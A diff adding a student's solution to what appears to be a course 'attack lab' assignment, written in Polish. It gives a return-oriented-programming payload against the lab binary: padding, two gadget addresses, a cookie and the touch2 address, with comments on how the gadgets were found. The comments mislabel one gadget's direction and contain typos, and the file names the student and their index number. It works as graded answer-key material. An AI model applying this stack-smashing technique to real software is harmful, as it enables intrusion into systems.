@@ -1,0 +1,38 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Artur Jankowski, 317928
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+ /*
+* gadget 1 -> popq %rax (zdejmuje ze stosu cookie)
+* gadget 2 -> movq %rdi, %rax (umieszcza cookie w rax)
+*
+* 0000000000401d07 <getval_283>:
+*   401d07:	b8 58 90 90 c3       	mov    $0xc3909058,%eax         # popq %rax | nop
+*   401d0c:	c3                   	retq
+* gadget1: 0x0000000000401d07 + 0x1 = 0x0000000000401d08 (08 1d 40 00 00 00 00 00)
+*
+* 0000000000401d14 <getval_351>:
+*   401d14:	b8 3f 48 89 c7       	mov    $0xc789483f,%eax         # (q) %rdi <- %rax
+*   401d19:	c3                   	retq
+* gadget2: 0x0000000000401d14 + 0x2 = 0x0000000000401d16 (16 1d 40 00 00 00 00 00)
+*
+* Idea chcemy zrobić ramkę stosu:
+* -----------
+* adres touch (adres wykorzystanu przez rat, gadgetu 2)
+* gadget 2 (adres wykorzystany przez ret, gadgetu 1)
+* cookie
+* adget 1
+* padding
+* -----------
+*/
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 24 bajty paddingu */
+08 1d 40 00 00 00 00 00 /* adres gadget 1 */
+72 c3 d4 64 00 00 00 00 /* cookie */
+16 1d 40 00 00 00 00 00 /* adres gadget 2 */
+7f 1b 40 00 00 00 00 00 /* adres touch2 */
